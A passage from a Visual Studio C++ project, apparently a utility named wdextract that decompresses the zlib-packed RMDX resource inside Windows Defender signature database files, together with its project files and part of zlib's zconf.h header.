//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file

#ifndef PCH_H
#define PCH_H

// TODO: add headers that you want to pre-compile here

#endif //PCH_H

```

`source/wdextract/wdextract/wdextract.cpp`:

```cpp
#include "pch.h"
#include <Windows.h>
#include <strsafe.h>
#include "zlib.h"

#pragma comment(lib, "zlibwapi.lib")

typedef struct _RMDX_HEADER {
    ULONG Signature;        //0
    ULONG Unknown1;         //4
    ULONG Unknown2;         //8
    ULONG Options;          //12 (0C)
    ULONG Unknown3;         //16
    ULONG Unknown4;         //20
    ULONG DataOffset;       //24 (18)
    ULONG Checksum;         //28 (1C)
    //incomplete, irrelevant

} RMDX_HEADER, *PRMDX_HEADER;

typedef struct _CDATA_HEADER {
    ULONG Length;             //0
    ULONG Checksum;           //4
    BYTE Data[1];             //8
} CDATA_HEADER, *PCDATA_HEADER;

#define CHUNK 32768// 16384

unsigned char input_buffer[CHUNK];
unsigned char output_buffer[CHUNK];

#define ShowError(Error) MessageBox(GetDesktopWindow(), Error, NULL, MB_ICONERROR)
#define RtlOffsetToPointer(Base, Offset) ((PCHAR)( ((PCHAR)(Base)) + ((ULONG_PTR)(Offset)) ))

ULONG fwrite(PBYTE InputBuffer, ULONG Size, ULONG Count, HANDLE hFile)
{
    DWORD write = 0;
    WriteFile(hFile, InputBuffer, Count * Size, &write, NULL);
    return write;
}

void ExtractData(LPWSTR FileName)
{
    BOOLEAN IsCompressed = FALSE;
    HANDLE  FileOutputHandle = INVALID_HANDLE_VALUE;
    LPWSTR  NewFileName;
    SIZE_T  FileNameLength = 0;

    int ret;
    unsigned have, got;
    z_stream strm;

    __try {

        HMODULE Dll = LoadLibraryEx(FileName, NULL, DONT_RESOLVE_DLL_REFERENCES);
        if (Dll == NULL) {
            ShowError(TEXT("Cannot load input file."));
            __leave;
        }

        HRSRC hRes = FindResource(Dll, MAKEINTRESOURCE(1000), TEXT("RT_RCDATA"));
        HGLOBAL hResData = LoadResource(Dll, hRes);
        PVOID Data = LockResource(hResData);

        PRMDX_HEADER Header = (PRMDX_HEADER)Data;
        if (Header == NULL) {
            ShowError(TEXT("Resource not found."));
            __leave;
        }

        if (Header->Signature != 'XDMR') {
            ShowError(TEXT("Signature not found."));
            __leave;
        }

        IsCompressed = ((Header->Options >> 1) & 0xff);
        if (IsCompressed != TRUE) {
            ShowError(TEXT("Unexpected header value."));
            __leave;
        }

        PCDATA_HEADER DataHeader = (PCDATA_HEADER)RtlOffsetToPointer(Header, Header->DataOffset);
        if (DataHeader->Length == 0) {
            ShowError(TEXT("Unexpected data header size."));
            __leave;
        }

        StringCchLength(FileName, MAX_PATH, &FileNameLength);
        FileNameLength += (1 + MAX_PATH);
        NewFileName = (LPWSTR)LocalAlloc(LPTR, FileNameLength * sizeof(WCHAR));
        if (NewFileName == NULL) {
            ShowError(TEXT("Memory allocation error."));
            __leave;
        }

        StringCchPrintf(NewFileName, FileNameLength, TEXT("%s.extracted"), FileName);

        FileOutputHandle = CreateFile(NewFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        LocalFree(NewFileName);

        if (FileOutputHandle == INVALID_HANDLE_VALUE) {
            ShowError(TEXT("Can not create output file."));
            __leave;
        }

        __stosb(input_buffer, 0, sizeof(input_buffer));
        __stosb(output_buffer, 0, sizeof(output_buffer));

        strm.zalloc = Z_NULL;
        strm.zfree = Z_NULL;
        strm.opaque = Z_NULL;
        strm.avail_in = 0;
        strm.next_in = Z_NULL;
        ret = inflateInit2(&strm, -15);
        if (ret != Z_OK) {
            ShowError(TEXT("inflateInit2 error."));
            __leave;
        }

        DWORD CurrentPosition = 0;
        DWORD CopyLength;
        DWORD TotalBytesWritten = 0;
        DWORD ResourceSize = DataHeader->Length;
        Data = DataHeader->Data;

        do {

            CopyLength = CHUNK;
            if (CurrentPosition + CopyLength > ResourceSize)
                CopyLength = ResourceSize - CurrentPosition;

            RtlCopyMemory(input_buffer, RtlOffsetToPointer(Data, CurrentPosition), CopyLength);
            CurrentPosition += CopyLength;

            strm.avail_in = CopyLength;
            if (strm.avail_in == 0)
                break;
            strm.next_in = input_buffer;

            do {
                strm.avail_out = CHUNK;
                strm.next_out = output_buffer;
                ret = inflate(&strm, Z_NO_FLUSH);

                switch (ret) {
                case Z_NEED_DICT:
                    ret = Z_DATA_ERROR;
                case Z_DATA_ERROR:
                case Z_MEM_ERROR:
                    inflateEnd(&strm);
                    __leave;
                }
                have = CHUNK - strm.avail_out;
                got = fwrite(output_buffer, 1, have, FileOutputHandle);
                TotalBytesWritten += got;
                if (got != have) {
                    inflateEnd(&strm);
                    ShowError(TEXT("Error while unpacking."));
                    __leave;
                }
            } while (strm.avail_out == 0);

        } while (ret != Z_STREAM_END);

        inflateEnd(&strm);

        WCHAR szTotalMsg[200];

        StringCbPrintf(szTotalMsg, 
            _countof(szTotalMsg), 
            TEXT("Unpack code\r\nTotal bytes written = %lu\r\nTotal bytes read = %lu"), 
            TotalBytesWritten, 
            CurrentPosition);

        MessageBox(GetDesktopWindow(), szTotalMsg, TEXT(""), MB_ICONINFORMATION);

    }
    __finally {
        if (FileOutputHandle != INVALID_HANDLE_VALUE)
            CloseHandle(FileOutputHandle);
    }
}

int main()
{
    INT nArgs = 0;
    BOOLEAN fCommand = FALSE;

    LPWSTR *szArglist = CommandLineToArgvW(GetCommandLineW(), &nArgs);
    if (szArglist) {

        if (nArgs > 0) {
            LPWSTR Param = szArglist[1];
            if (Param) {
                ExtractData(Param);
                fCommand = TRUE;
            }
        }
        LocalFree(szArglist);
    }

    if (fCommand != TRUE)
        MessageBox(GetDesktopWindow(), TEXT("Usage: wdextract file"), TEXT("WD data extractor"), MB_OK);

    return 0;
}

```

`source/wdextract/wdextract/wdextract.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>15.0</VCProjectVersion>
    <ProjectGuid>{08AEC00F-42ED-4E62-AE8D-0BFCE30A3F57}</ProjectGuid>
    <Keyword>Win32Proj</Keyword>
    <RootNamespace>wdextract</RootNamespace>
    <WindowsTargetPlatformVersion>10.0.17763.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LinkIncremental>true</LinkIncremental>
    <OutDir>.\output\$(Platform)\$(Configuration)\</OutDir>
    <IntDir>.\output\$(Platform)\$(Configuration)\</IntDir>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
    <OutDir>.\output\$(Platform)\$(Configuration)\</OutDir>
    <IntDir>.\output\$(Platform)\$(Configuration)\</IntDir>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <LinkIncremental>false</LinkIncremental>
    <OutDir>.\output\$(Platform)\$(Configuration)\</OutDir>
    <IntDir>.\output\$(Platform)\$(Configuration)\</IntDir>
    <CodeAnalysisRuleSet>..\..\..\Program Files (x86)\Microsoft Visual Studio\2017\Professional\Team Tools\Static Analysis Tools\Rule Sets\SecurityRules.ruleset</CodeAnalysisRuleSet>
    <RunCodeAnalysis>false</RunCodeAnalysis>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
    <OutDir>.\output\$(Platform)\$(Configuration)\</OutDir>
    <IntDir>.\output\$(Platform)\$(Configuration)\</IntDir>
    <CodeAnalysisRuleSet>..\..\..\Program Files (x86)\Microsoft Visual Studio\2017\Professional\Team Tools\Static Analysis Tools\Rule Sets\SecurityRules.ruleset</CodeAnalysisRuleSet>
    <RunCodeAnalysis>false</RunCodeAnalysis>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <PrecompiledHeader>Use</PrecompiledHeader>
      <WarningLevel>Level4</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <PrecompiledHeader>Use</PrecompiledHeader>
      <WarningLevel>Level4</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <PrecompiledHeader>Use</PrecompiledHeader>
      <WarningLevel>Level4</WarningLevel>
      <Optimization>MinSpace</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
      <StringPooling>true</StringPooling>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
      <FavorSizeOrSpeed>Size</FavorSizeOrSpeed>
      <MultiProcessorCompilation>true</MultiProcessorCompilation>
      <EnablePREfast>false</EnablePREfast>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>false</GenerateDebugInformation>
      <AdditionalOptions>/NOCOFFGRPINFO %(AdditionalOptions)</AdditionalOptions>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <PrecompiledHeader>Use</PrecompiledHeader>
      <WarningLevel>Level4</WarningLevel>
      <Optimization>MinSpace</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
      <StringPooling>true</StringPooling>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
      <FavorSizeOrSpeed>Size</FavorSizeOrSpeed>
      <MultiProcessorCompilation>true</MultiProcessorCompilation>
      <EnablePREfast>false</EnablePREfast>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>false</GenerateDebugInformation>
      <AdditionalOptions>/NOCOFFGRPINFO %(AdditionalOptions)</AdditionalOptions>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClInclude Include="pch.h" />
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="pch.cpp">
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">Create</PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">Create</PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">Create</PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|x64'">Create</PrecompiledHeader>
    </ClCompile>
    <ClCompile Include="wdextract.cpp" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`source/wdextract/wdextract/wdextract.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="pch.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="pch.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="wdextract.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
</Project>
```

`source/wdextract/wdextract/wdextract.vcxproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LocalDebuggerCommandArguments>C:\wdbase\mpasbase.dll</LocalDebuggerCommandArguments>
    <DebuggerFlavor>WindowsLocalDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LocalDebuggerCommandArguments>c:\wdbase\mpavbase.vdm</LocalDebuggerCommandArguments>
    <DebuggerFlavor>WindowsLocalDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LocalDebuggerCommandArguments>C:\wdbase\mpasbase.dll</LocalDebuggerCommandArguments>
    <DebuggerFlavor>WindowsLocalDebugger</DebuggerFlavor>
  </PropertyGroup>
</Project>
```

`source/wdextract/wdextract/zconf.h`:

```h
/* zconf.h -- configuration of the zlib compression library
 * Copyright (C) 1995-2016 Jean-loup Gailly, Mark Adler
 * For conditions of distribution and use, see copyright notice in zlib.h
 */

/* @(#) $Id$ */

#ifndef ZCONF_H
#define ZCONF_H

/*
 * If you *really* need a unique prefix for all types and library functions,
 * compile with -DZ_PREFIX. The "standard" zlib should be compiled without it.
 * Even better than compiling with -DZ_PREFIX would be to use configure to set
 * this permanently in zconf.h using "./configure --zprefix".
 */
#ifdef Z_PREFIX     /* may be set to #if 1 by ./configure */
#  define Z_PREFIX_SET

/* all linked symbols and init macros */
#  define _dist_code            z__dist_code
#  define _length_code          z__length_code
#  define _tr_align             z__tr_align
#  define _tr_flush_bits        z__tr_flush_bits
#  define _tr_flush_block       z__tr_flush_block
#  define _tr_init              z__tr_init
#  define _tr_stored_block      z__tr_stored_block
#  define _tr_tally             z__tr_tally
#  define adler32               z_adler32
#  define adler32_combine       z_adler32_combine
#  define adler32_combine64     z_adler32_combine64
#  define adler32_z             z_adler32_z
#  ifndef Z_SOLO
#    define compress              z_compress
#    define compress2             z_compress2
#    define compressBound         z_compressBound
#  endif
#  define crc32                 z_crc32
#  define crc32_combine         z_crc32_combine
#  define crc32_combine64       z_crc32_combine64
#  define crc32_z               z_crc32_z
#  define deflate               z_deflate
#  define deflateBound          z_deflateBound
#  define deflateCopy           z_deflateCopy
#  define deflateEnd            z_deflateEnd
#  define deflateGetDictionary  z_deflateGetDictionary
#  define deflateInit           z_deflateInit
#  define deflateInit2          z_deflateInit2
#  define deflateInit2_         z_deflateInit2_
#  define deflateInit_          z_deflateInit_
#  define deflateParams         z_deflateParams
#  define deflatePending        z_deflatePending
#  define deflatePrime          z_deflatePrime
#  define deflateReset          z_deflateReset
#  define deflateResetKeep      z_deflateResetKeep
#  define deflateSetDictionary  z_deflateSetDictionary
#  define deflateSetHeader      z_deflateSetHeader
#  define deflateTune           z_deflateTune
#  define deflate_copyright     z_deflate_copyright
#  define get_crc_table         z_get_crc_table
#  ifndef Z_SOLO
#    define gz_error              z_gz_error
#    define gz_intmax             z_gz_intmax
#    define gz_strwinerror        z_gz_strwinerror
#    define gzbuffer              z_gzbuffer
#    define gzclearerr            z_gzclearerr
#    define gzclose               z_gzclose
#    define gzclose_r             z_gzclose_r
#    define gzclose_w             z_gzclose_w
#    define gzdirect              z_gzdirect
#    define gzdopen               z_gzdopen
#    define gzeof                 z_gzeof
#    define gzerror               z_gzerror
#    define gzflush               z_gzflush
#    define gzfread               z_gzfread
#    define gzfwrite              z_gzfwrite
#    define gzgetc                z_gzgetc
#    define gzgetc_               z_gzgetc_
#    define gzgets                z_gzgets
#    define gzoffset              z_gzoffset
#    define gzoffset64            z_gzoffset64
#    define gzopen                z_gzopen
#    define gzopen64              z_gzopen64
#    ifdef _WIN32
#      define gzopen_w              z_gzopen_w
#    endif
#    define gzprintf              z_gzprintf
#    define gzputc                z_gzputc
#    define gzputs                z_gzputs
#    define gzread                z_gzread
#    define gzrewind              z_gzrewind
#    define gzseek                z_gzseek
#    define gzseek64              z_gzseek64
#    define gzsetparams           z_gzsetparams
#    define gztell                z_gztell
#    define gztell64              z_gztell64
#    define gzungetc              z_gzungetc
#    define gzvprintf             z_gzvprintf
#    define gzwrite               z_gzwrite
#  endif
#  define inflate               z_inflate
#  define inflateBack           z_inflateBack
#  define inflateBackEnd        z_inflateBackEnd
#  define inflateBackInit       z_inflateBackInit
#  define inflateBackInit_      z_inflateBackInit_
#  define inflateCodesUsed      z_inflateCodesUsed
#  define inflateCopy           z_inflateCopy
#  define inflateEnd            z_inflateEnd
#  define inflateGetDictionary  z_inflateGetDictionary
#  define inflateGetHeader      z_inflateGetHeader
#  define inflateInit           z_inflateInit
#  define inflateInit2          z_inflateInit2
#  define inflateInit2_         z_inflateInit2_
#  define inflateInit_          z_inflateInit_
#  define inflateMark           z_inflateMark
#  define inflatePrime          z_inflatePrime
#  define inflateReset          z_inflateReset
#  define inflateReset2         z_inflateReset2
#  define inflateResetKeep      z_inflateResetKeep
#  define inflateSetDictionary  z_inflateSetDictionary
#  define inflateSync           z_inflateSync
#  define inflateSyncPoint      z_inflateSyncPoint
#  define inflateUndermine      z_inflateUndermine
#  define inflateValidate       z_inflateValidate
#  define inflate_copyright     z_inflate_copyright
#  define inflate_fast          z_inflate_fast
#  define inflate_table         z_inflate_table
#  ifndef Z_SOLO
#    define uncompress            z_uncompress
#    define uncompress2           z_uncompress2
#  endif
#  define zError                z_zError
#  ifndef Z_SOLO
#    define zcalloc               z_zcalloc
#    define zcfree                z_zcfree
#  endif
#  define zlibCompileFlags      z_zlibCompileFlags
#  define zlibVersion           z_zlibVersion

/* all zlib typedefs in zlib.h and zconf.h */
#  define Byte                  z_Byte
#  define Bytef                 z_Bytef
#  define alloc_func            z_alloc_func
#  define charf                 z_charf
#  define free_func             z_free_func
#  ifndef Z_SOLO
#    define gzFile                z_gzFile
#  endif
#  define gz_header             z_gz_header
#  define gz_headerp            z_gz_headerp
#  define in_func               z_in_func
#  define intf                  z_intf
#  define out_func              z_out_func
#  define uInt                  z_uInt
#  define uIntf                 z_uIntf
#  define uLong                 z_uLong
#  define uLongf                z_uLongf
#  define voidp                 z_voidp
#  define voidpc                z_voidpc
#  define voidpf                z_voidpf

/* all zlib structs in zlib.h and zconf.h */
#  define gz_header_s           z_gz_header_s
#  define internal_state        z_internal_state

#endif

#if defined(__MSDOS__) && !defined(MSDOS)
#  define MSDOS
#endif
#if (defined(OS_2) || defined(__OS2__)) && !defined(OS2)
#  define OS2
#endif
#if defined(_WINDOWS) && !defined(WINDOWS)
#  define WINDOWS
#endif
#if defined(_WIN32) || defined(_WIN32_WCE) || defined(__WIN32__)
#  ifndef WIN32
#    define WIN32
#  endif
#endif
#if (defined(MSDOS) || defined(OS2) || defined(WINDOWS)) && !defined(WIN32)
#  if !defined(__GNUC__) && !defined(__FLAT__) && !defined(__386__)
#    ifndef SYS16BIT
#      define SYS16BIT
#    endif
#  endif
#endif

/*
 * Compile with -DMAXSEG_64K if the alloc function cannot allocate more
 * than 64k bytes at a time (needed on systems with 16-bit int).
 */
#ifdef SYS16BIT
#  define MAXSEG_64K
#endif
#ifdef MSDOS
#  define UNALIGNED_OK
#endif

#ifdef __STDC_VERSION__
#  ifndef STDC
#    define STDC
#  endif
#  if __STDC_VERSION__ >= 199901L
#    ifndef STDC99
#      define STDC99
#    endif
#  endif
#endif
#if !defined(STDC) && (defined(__STDC__) || defined(__cplusplus))
#  define STDC
#endif
#if !defined(STDC) && (defined(__GNUC__) || defined(__BORLANDC__))
#  define STDC
#endif
#if !defined(STDC) && (defined(MSDOS) || defined(WINDOWS) || defined(WIN32))
#  define STDC
#endif
#if !defined(STDC) && (defined(OS2) || defined(__HOS_AIX__))
#  define STDC
#endif

#if defined(__OS400__) && !defined(STDC)    /* iSeries (formerly AS/400). */
#  define STDC
#endif

#ifndef STDC
#  ifndef const /* cannot use !defined(STDC) && !defined(const) on Mac */
#    define const       /* note: need a more gentle solution here */
#  endif
#endif

#if defined(ZLIB_CONST) && !defined(z_const)
#  define z_const const
#else
#  define z_const
#endif

#ifdef Z_SOLO
   typedef unsigned long z_size_t;
#else
#  define z_longlong long long
#  if defined(NO_SIZE_T)
     typedef unsigned NO_SIZE_T z_size_t;
#  elif defined(STDC)
#    include <stddef.h>
     typedef size_t z_size_t;
#  else
     typedef unsigned long z_size_t;
#  endif
#  undef z_longlong
#endif

/* Maximum value for memLevel in deflateInit2 */
#ifndef MAX_MEM_LEVEL
#  ifdef MAXSEG_64K
#    define MAX_MEM_LEVEL 8
#  else
#    define MAX_MEM_LEVEL 9
#  endif
#endif

/* Maximum value for windowBits in deflateInit2 and inflateInit2.
 * WARNING: reducing MAX_WBITS makes minigzip unable to extract .gz files
 * created by gzip. (Files created by minigzip can still be extracted by
 * gzip.)
 */
#ifndef MAX_WBITS
#  define MAX_WBITS   15 /* 32K LZ77 window */
#endif

/* The memory requirements for deflate are (in bytes):
            (1 << (windowBits+2)) +  (1 << (memLevel+9))
 that is: 128K for windowBits=15  +  128K for memLevel = 8  (default values)
 plus a few kilobytes for small objects. For example, if you want to reduce
 the default memory requirements from 256K to 128K, compile with
     make CFLAGS="-O -DMAX_WBITS=14 -DMAX_MEM_LEVEL=7"
 Of course this will generally degrade compression (there's no free lunch).

   The memory requirements for inflate are (in bytes) 1 << windowBits
 that is, 32K for windowBits=15 (default value) plus about 7 kilobytes
 for small objects.
*/

                        /* Type declarations */

#ifndef OF /* function prototypes */
#  ifdef STDC
#    define OF(args)  args
#  else
#    define OF(args)  ()
#  endif
#endif

#ifndef Z_ARG /* function prototypes for stdarg */
#  if defined(STDC) || defined(Z_HAVE_STDARG_H)
#    define Z_ARG(args)  args
#  else
#    define Z_ARG(args)  ()
#  endif
#endif

/* The following definitions for FAR are needed only for MSDOS mixed
 * model programming (small or medium model with some far allocations).
 * This was tested only with MSC; for other MSDOS compilers you may have
 * to define NO_MEMCPY in zutil.h.  If you don't need the mixed model,
 * just define FAR to be empty.
 */
#ifdef SYS16BIT
#  if defined(M_I86SM) || defined(M_I86MM)
     /* MSC small or medium model */
#    define SMALL_MEDIUM
#    ifdef _MSC_VER
#      define FAR _far
#    else
#      define FAR far
#    endif
#  endif
#  if (defined(__SMALL__) || defined(__MEDIUM__))
     /* Turbo C small or medium model */
#    define SMALL_MEDIUM
#    ifdef __BORLANDC__
#      define FAR _far
#    else
#      define FAR far
#    endif
#  endif
#endif

#if defined(WINDOWS) || defined(WIN32)
   /* If building or using zlib as a DLL, define ZLIB_DLL.
    * This is not mandatory, but it offers a little performance increase.
    */
#  ifdef ZLIB_DLL
#    if defined(WIN32) && (!defined(__BORLANDC__) || (__BORLANDC__ >= 0x500))
#      ifdef ZLIB_INTERNAL
#        define ZEXTERN extern __declspec(dllexport)
#      else
#        define ZEXTERN extern __declspec(dllimport)
#      endif
#    endif
#  endif  /* ZLIB_DLL */
   /* If building or using zlib with the WINAPI/WINAPIV calling convention,
    * define ZLIB_WINAPI.
    * Caution: the standard ZLIB1.DLL is NOT compiled using ZLIB_WINAPI.
    */
#  ifdef ZLIB_WINAPI
#    ifdef FAR
#      undef FAR
#    endif
#    include <windows.h>
     /* No need for _export, use ZLIB.DEF instead. */
     /* For complete Windows compatibility, use WINAPI, not __stdcall. */
#    define ZEXPORT WINAPI
#    ifdef WIN32
#      define ZEXPORTVA WINAPIV
#    else
#      define ZEXPORTVA FAR CDECL
#    endif
#  endif
#endif

#if defined (__BEOS__)
#  ifdef ZLIB_DLL
#    ifdef ZLIB_INTERNAL
#      define ZEXPORT   __declspec(dllexport)
#      define ZEXPORTVA __declspec(dllexport)
#    else
#      define ZEXPORT   __declspec(dllimport)
#      define ZEXPORTVA __declspec(dllimport)
#    endif
#  endif
#endif

#ifndef ZEXTERN
#  define ZEXTERN extern
#endif
#ifndef ZEXPORT
#  define ZEXPORT
#endif
#ifndef ZEXPORTVA
#  define ZEXPORTVA
#endif

#ifndef FAR
#  define FAR
#endif

#if !defined(__MACTYPES__)
typedef unsigned char  Byte;  /* 8 bits */
#endif
typedef unsigned int   uInt;  /* 16 bits or more */
typedef unsigned long  uLong; /* 32 bits or more */

